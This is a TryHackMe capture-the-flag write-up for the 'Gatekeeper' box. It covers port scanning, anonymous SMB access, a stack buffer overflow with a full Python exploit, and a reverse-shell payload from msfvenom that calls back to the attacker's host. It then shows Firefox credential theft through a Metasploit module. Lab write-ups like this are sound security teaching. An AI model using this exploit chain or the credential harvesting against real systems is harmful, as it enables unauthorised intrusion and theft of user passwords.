---
layout: post
title:  "Gatekeeper (THM)"
date:   2025-08-02 18:59:43 -0400
author: robo.uzi
tags: [TryHackMe, ctf]
---

## Initial Compromise

I run `nmap -Pn -p- -T5 -vv 10.10.246.226` then `nmap -sVC -Pn -p 135,139,445,3389,31337,49152,49153,49154,49160,49161,49162 -vv -T4 10.10.246.226`:
```shell
PORT      STATE SERVICE            REASON  VERSION  
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC  
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn  
445/tcp   open  microsoft-ds       syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)  
3389/tcp  open  ssl/ms-wbt-server? syn-ack  
| ssl-cert: Subject: commonName=gatekeeper  
| Issuer: commonName=gatekeeper  
| Public Key type: rsa  
| Public Key bits: 2048  
| Signature Algorithm: sha1WithRSAEncryption  
| Not valid before: 2025-05-19T04:23:30  
| Not valid after:  2025-11-18T04:23:30  
| rdp-ntlm-info:    
|   Target_Name: GATEKEEPER  
|   NetBIOS_Domain_Name: GATEKEEPER  
|   NetBIOS_Computer_Name: GATEKEEPER  
|   DNS_Domain_Name: gatekeeper  
|   DNS_Computer_Name: gatekeeper  
|   Product_Version: 6.1.7601  
|_  System_Time: 2025-05-20T04:41:35+00:00  
|_ssl-date: 2025-05-20T04:41:41+00:00; -10s from scanner time.  
31337/tcp open  Elite?             syn-ack  
| fingerprint-strings:    
|   FourOhFourRequest:    
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0  
|     Hello  
|   GenericLines:    
|     Hello    
|     Hello  
|   GetRequest:    
|     Hello GET / HTTP/1.0  
|     Hello  
|   HTTPOptions:    
|     Hello OPTIONS / HTTP/1.0  
|     Hello  
|   Help:    
|     Hello HELP  
|   Kerberos:    
|     Hello !!!  
|   LDAPSearchReq:    
|     Hello 0  
|     Hello  
|   LPDString:    
|     Hello    
|     default!!!  
|   RTSPRequest:    
|     Hello OPTIONS / RTSP/1.0  
|     Hello  
|   SIPOptions:    
|     Hello OPTIONS sip:nm SIP/2.0  
|     Hello Via: SIP/2.0/TCP nm;branch=foo  
|     Hello From: <sip:nm@nm>;tag=root  
|     Hello To: <sip:nm2@nm2>  
|     Hello Call-ID: 50000  
|     Hello CSeq: 42 OPTIONS  
|     Hello Max-Forwards: 70  
|     Hello Content-Length: 0  
|     Hello Contact: <sip:nm@nm>  
|     Hello Accept: application/sdp  
|     Hello  
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie:    
|_    Hello  
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC  
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC  
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC  
49160/tcp open  msrpc              syn-ack Microsoft Windows RPC  
49161/tcp open  msrpc              syn-ack Microsoft Windows RPC  
49162/tcp open  msrpc              syn-ack Microsoft Windows RPC  
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows  
Host script results:  
|_clock-skew: mean: 47m50s, deviation: 1h47m20s, median: -10s  
| smb-os-discovery:    
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)  
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional  
|   Computer name: gatekeeper  
|   NetBIOS computer name: GATEKEEPER\x00  
|   Workgroup: WORKGROUP\x00  
|_  System time: 2025-05-20T00:41:35-04:00  
| smb2-security-mode:    
|   2:1:0:    
|_    Message signing enabled but not required  
| smb2-time:    
|   date: 2025-05-20T04:41:35  
|_  start_date: 2025-05-20T04:22:59  
| p2p-conficker:    
|   Checking for Conficker.C or higher...  
|   Check 1 (port 36600/tcp): CLEAN (Couldn't connect)  
|   Check 2 (port 49293/tcp): CLEAN (Couldn't connect)  
|   Check 3 (port 65231/udp): CLEAN (Timeout)  
|   Check 4 (port 19064/udp): CLEAN (Failed to receive data)  
|_  0/4 checks are positive: Host is CLEAN or ports are blocked  
| nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:54:ac:b4:5e:21 (unknown)  
| Names:  
|   GATEKEEPER<00>       Flags: <unique><active>  
|   WORKGROUP<00>        Flags: <group><active>  
|   GATEKEEPER<20>       Flags: <unique><active>  
|   WORKGROUP<1e>        Flags: <group><active>  
|   WORKGROUP<1d>        Flags: <unique><active>  
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>  
| smb-security-mode:    
|   account_used: guest  
|   authentication_level: user  
|   challenge_response: supported  
|_  message_signing: disabled (dangerous, but default)
```

Port `31337` looks interesting. I connect with `nc -nv 10.10.246.226 31337`:
```shell
(UNKNOWN) [10.10.246.226] 31337 (?) open  
hello  
Hello hello!!!
```

I enumerate smb shares with `nmap -p 445 --script smb-enum-shares 10.10.246.226`:
```shell
PORT    STATE SERVICE  
445/tcp open  microsoft-ds  
  
Host script results:  
| smb-enum-shares:    
|   account_used: guest  
|   \\10.10.246.226\ADMIN$:    
|     Type: STYPE_DISKTREE_HIDDEN  
|     Comment: Remote Admin  
|     Anonymous access: <none>  
|     Current user access: <none>  
|   \\10.10.246.226\C$:    
|     Type: STYPE_DISKTREE_HIDDEN  
|     Comment: Default share  
|     Anonymous access: <none>  
|     Current user access: <none>  
|   \\10.10.246.226\IPC$:    
|     Type: STYPE_IPC_HIDDEN  
|     Comment: Remote IPC  
|     Anonymous access: READ  
|     Current user access: READ/WRITE  
|   \\10.10.246.226\Users:    
|     Type: STYPE_DISKTREE  
|     Comment:    
|     Anonymous access: <none>  
|_    Current user access: READ
```
I have anonymous access. I list them again like this: `smbclient -L //10.10.246.226/ -N`.

I then connect using `smbclient //10.10.246.226/Users -N`. I `cd` to `Share` and `get gatekeeper.exe`. 

Here is what I got: 
```shell
file gatekeeper.exe  
gatekeeper.exe: PE32 executable (console) Intel 80386, for MS Windows, 5 sections
```

I transfer the binary to my windows machine. I needed to install `VC_redist.x86.exe` on my windows VM. After this the binary opens and runs inside immunity debugger. 

I connect with `nc -nv 192.168.126.130 31337`. From here I test the offset manually. It crashes after `160` characters.

I run `msf-pattern_create -l 460` to generate a pattern of a length 300 bytes longer than the string that crashed the server.

I crash the server with this pattern and ran `msf-pattern_offset -l 460 -q 39654138` to get an exact offset of `146`. Here `39654138` is the value of the `EIP` register.

I use this script to test my offset and confirm and its crashing with the `EIP` register being overwritten with 4 `B` characters.
```python
import sys,socket

message = b"A"*146 + b"B"*4
payload = (b"")

try:
    print("sending")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.126.130",31337))
    s.send(message + b"\n")
    s.recv(1024)
    s.close()
except:
    print("Cant connect.")
    sys.exit()
```

I now need to check for bad characters. I set a working directory for mona like this: `!mona config -set workingfolder c:\mona\%p`.

To start I generate a byte array excluding the null byte by default using `mona` like this: `!mona bytearray -b "\x00"`. 

After I crash the server again I can run `!mona compare -f C:\mona\gatekeeper\bytearray.bin -a esp` to check which characters are bad.

I update my python script to set the payload variable to the list of bad characters. I add the payload to the message and run it. I find `0a` is a bad character. 

Generate a new bytearray like this `!mona bytearray -b "\x00\x0a"`, update the script accordingly, and check the bad chars again. 

I get `status unmodified` which means I have all the bad characters `\x00\x0a`. Now I can find a jump point and generate shellcode for a reverse shell. 

To find a jump point I run `!mona jmp -r esp -cpb \x00\x0a` and I find a memory address at `0x080414c3`. This will need to be in little endian for my exploit. It will look like `\xc3\x14\x04\x08`.

I generate my shellcode like this: `msfvenom -p windows/shell_reverse_tcp LHOST=10.13.66.123 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00\x0a"`

I run `msfconsole` then `use exploit/multi/handler` then `set payload windows/shell_reverse_tcp` then `set EXITFUNC thread` then `set LHOST ip`.

That gets me a shell:
```msfconsole
C:\Users\natbat\Desktop>whoami  
whoami  
gatekeeper\natbat
```
___

## Privilege Escalation

On the desktop I find a file called `Firefox.lnk`. Metasploit has a `multi/gather/firefox_creds` module. I background the session, upgrade it to a meterpreter shell with `sessions -u 2`, and `use multi/gather/firefox_creds`. I run `set SESSION 3` and `exploit`:
```shell
[-] Error loading USER S-1-5-21-663372427-3699997616-3390412905-1000: Hive could not be loaded, are you Admin?  
[*] Checking for Firefox profile in: C:\Users\natbat\AppData\Roaming\Mozilla\  
[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release  
[+] Downloaded cert9.db: /home/user/.msf4/loot/20250521175718_default_10.10.112.61_ff.ljfn812a.cert_907796.bin  
[+] Downloaded cookies.sqlite: /home/user/.msf4/loot/20250521175720_default_10.10.112.61_ff.ljfn812a.cook_023014.bin  
[+] Downloaded key4.db: /home/user/.msf4/loot/20250521175723_default_10.10.112.61_ff.ljfn812a.key4_376735.bin  
[+] Downloaded logins.json: /home/user/.msf4/loot/20250521175725_default_10.10.112.61_ff.ljfn812a.logi_388679.bin  
[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\rajfzh3y.default  
[*] Post module execution completed
```

I transfer these files to the directory I'm working in and rename them to their original names. I find this script [https://github.com/unode/firefox_decrypt](https://github.com/unode/firefox_decrypt) which will extract the credentials from these files. I git clone it.

I cd to the file and run `python3 firefox_decrypt.py ../`:
```shell  
2025-05-21 18:08:16,857 - WARNING - profile.ini not found in ../  
2025-05-21 18:08:16,857 - WARNING - Continuing and assuming '../' is a profile location  
  
Website:   https://creds.com  
Username: 'mayor'  
Password: 'redacted'
```

I use these creds in remmina to rdp and get the root flag. That's all!

___

This was my final exploit script for the buffer overflow:
```python
import sys,socket

message = b"A"*146
nops = b"\x90"*32
esp_ret = b"\xc3\x14\x04\x08"

buf = b""
buf += b"\xda\xd0\xd9\x74\x24\xf4\x5b\x33\xc9\xb1\x52\xbd\xbd\xa3"
buf += b"\x27\x32\x31\x6b\x17\x83\xc3\x04\x03\xd6\xb0\xc5\xc7\xd4"
buf += b"\x5f\x8b\x28\x24\xa0\xec\xa1\xc1\x91\x2c\xd5\x82\x82\x9c"
buf += b"\x9d\xc6\x2e\x56\xf3\xf2\xa5\x1a\xdc\xf5\x0e\x90\x3a\x38"
buf += b"\x8e\x89\x7f\x5b\x0c\xd0\x53\xbb\x2d\x1b\xa6\xba\x6a\x46"
buf += b"\x4b\xee\x23\x0c\xfe\x1e\x47\x58\xc3\x95\x1b\x4c\x43\x4a"
buf += b"\xeb\x6f\x62\xdd\x67\x36\xa4\xdc\xa4\x42\xed\xc6\xa9\x6f"
buf += b"\xa7\x7d\x19\x1b\x36\x57\x53\xe4\x95\x96\x5b\x17\xe7\xdf"
buf += b"\x5c\xc8\x92\x29\x9f\x75\xa5\xee\xdd\xa1\x20\xf4\x46\x21"
buf += b"\x92\xd0\x77\xe6\x45\x93\x74\x43\x01\xfb\x98\x52\xc6\x70"
buf += b"\xa4\xdf\xe9\x56\x2c\x9b\xcd\x72\x74\x7f\x6f\x23\xd0\x2e"
buf += b"\x90\x33\xbb\x8f\x34\x38\x56\xdb\x44\x63\x3f\x28\x65\x9b"
buf += b"\xbf\x26\xfe\xe8\x8d\xe9\x54\x66\xbe\x62\x73\x71\xc1\x58"
buf += b"\xc3\xed\x3c\x63\x34\x24\xfb\x37\x64\x5e\x2a\x38\xef\x9e"
buf += b"\xd3\xed\xa0\xce\x7b\x5e\x01\xbe\x3b\x0e\xe9\xd4\xb3\x71"
buf += b"\x09\xd7\x19\x1a\xa0\x22\xca\x2f\x38\x6e\x71\x58\x40\x6e"
buf += b"\x94\xc4\xcd\x88\xfc\xe4\x9b\x03\x69\x9c\x81\xdf\x08\x61"
buf += b"\x1c\x9a\x0b\xe9\x93\x5b\xc5\x1a\xd9\x4f\xb2\xea\x94\x2d"
buf += b"\x15\xf4\x02\x59\xf9\x67\xc9\x99\x74\x94\x46\xce\xd1\x6a"
buf += b"\x9f\x9a\xcf\xd5\x09\xb8\x0d\x83\x72\x78\xca\x70\x7c\x81"
buf += b"\x9f\xcd\x5a\x91\x59\xcd\xe6\xc5\x35\x98\xb0\xb3\xf3\x72"
buf += b"\x73\x6d\xaa\x29\xdd\xf9\x2b\x02\xde\x7f\x34\x4f\xa8\x9f"
buf += b"\x85\x26\xed\xa0\x2a\xaf\xf9\xd9\x56\x4f\x05\x30\xd3\x6f"
buf += b"\xe4\x90\x2e\x18\xb1\x71\x93\x45\x42\xac\xd0\x73\xc1\x44"
buf += b"\xa9\x87\xd9\x2d\xac\xcc\x5d\xde\xdc\x5d\x08\xe0\x73\x5d"
buf += b"\x19"

try:
    print("sending")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.10.112.61",31337))
    s.send(message + esp_ret + nops + buf + b"\n")
    s.recv(1024)
    s.close()
except:
    print("Cant connect.")
    sys.exit()
```
___
